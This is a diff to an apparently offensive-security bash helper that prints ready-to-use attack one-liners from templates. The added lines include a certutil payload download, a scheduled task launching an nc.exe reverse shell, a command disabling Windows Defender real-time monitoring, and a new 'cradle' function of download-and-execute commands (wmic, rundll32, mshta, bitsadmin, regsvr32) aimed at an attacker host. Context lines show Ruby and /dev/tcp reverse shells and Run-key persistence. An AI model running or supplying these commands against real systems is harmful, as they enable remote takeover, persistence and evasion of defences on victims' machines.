@@ -120,7 +120,8 @@ function persist {
 
     cat << HERE
 
-   schtasks /create /sc minute /TN "EMOM" /TR "C:\Users\Public\\$1"
+   certutil -urlcache -split -f http://$1:$2/$3 C:\Users\Public\$3
+   schtasks /create /F /sc minute /mo 2 /TN "EOMOM" /TR "C:\Users\Public\nc.exe -e cmd.exe $1 $2"
 
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v EROR /t REG_SZ /d "C:\Users\Public\\$1"
 
@@ -144,18 +145,26 @@ function odd {
    ruby -rsocket -e'f=TCPSocket.open("$1",$2).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"
    
    r = Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()"
-	
-   
 
-   wmic os get /FORMAT:"http://10.10.14.53:9996/fG4DD.xsl
+   powershell Set-MpPreference -DisableRealtimeMonitoring $true
 
-   rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.10.14.53:9997/TE52j",false);x.send();eval(x.responseText);window.close();
+EOF
 
-   mshta http://10.10.14.53:9996/JehU3
+}
 
-   bitsadmin /transfer kTxCy /download /priority high http://10.10.14.53:9995/kTxCy.wsf %temp%\kTxCy.wsf & start /wait %temp%\kTxCy.wsf & del %temp%\kTxCy.wsf
+function cradle {
 
-   regsvr32 /s /u /n /i:http://10.10.14.53:9998/9l4aX scrobj
+	cat << EOF
+
+   wmic os get /FORMAT:"http://$1:$2/$3.xsl
+
+   rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://$1:$2/$3",false);x.send();eval(x.responseText);window.close();
+
+   mshta http://$1:$2/$3
+
+   bitsadmin /transfer kTxCy /download /priority high http://$1:$2/$3.wsf %temp%\$3.wsf & start /wait %temp%\$3.wsf & del %temp%\$3.wsf
+
+   regsvr32 /s /u /n /i:http://10.10.14.53:9998/$3 scrobj
 
 
 EOF
@@ -187,6 +196,8 @@ case "$3" in
     recon $ip $port ;;
 "persist")
     persist $file ;;
+"cradle")
+    cradle $ip $port $file ;;
 *)
     showHelp ;;
 esac
